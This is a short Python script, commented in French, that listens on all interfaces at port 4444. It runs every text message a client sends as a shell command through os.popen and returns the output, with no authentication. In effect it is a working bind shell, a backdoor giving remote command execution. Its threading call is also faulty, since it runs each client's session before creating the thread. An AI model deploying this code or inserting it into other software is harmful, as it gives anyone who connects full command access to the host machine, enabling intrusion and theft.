#!/usr/bin/env python3
import socket
import threading
import os
import pprint


# variable globale
PORT = 4444
HOST = "0.0.0.0"
BUFFERSIZE = 1024
ENCODING = "UTF-8"


# init socket server for serve client
SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def getPrompt() -> str:
    # permet de connaitre le repertoire courant du machine
    # exectutant le code
    return os.path.abspath(".").strip('\n') + "$ "

def sendMessage(socket: socket.socket, message: str) -> None:
    # fonction pour envoyer des messages aux client
    socket.send(message.encode(ENCODING))

def serve(socket: socket.socket) -> None:
    """Fonction qui servent le client connecte
    recevoire les message et les renvoire les messages aux clients

    socket: socket
    return: None
    """
    run = True
    while run:
        # send prompt to client
        sendMessage(socket, getPrompt())
        message = socket.recv(BUFFERSIZE).decode(ENCODING)
        # execute les messages venant du client
        output = os.popen(message).read()
        # envoyer les output aux client
        sendMessage(socket, output)
        if message[:2] == "cd" and len(message.split()) == 2:
            cmd, dir = message.split()
            # si le dossier exist
            if cmd == "cd" and os.path.exists(dir):
                os.chdir(dir)


def runServer(host: int, port: int) -> None:
    SOCKET.bind((host, port))
    print(f"server is running on {host=}:{port=}")
    SOCKET.listen()
    while True:
        try:
            socketClient, addr = SOCKET.accept()
            # initialiser le thread en fonction du serve,
            # toure en arrier plant, fonction asynchrone
            serverThread = threading.Thread(serve(socketClient))
            # lancer la fonction asynchrone pour recevoire
            # et envoirer les message aux client
            serverThread.start()
        except:
            pass


if __name__ == "__main__":
    runServer(HOST, PORT)

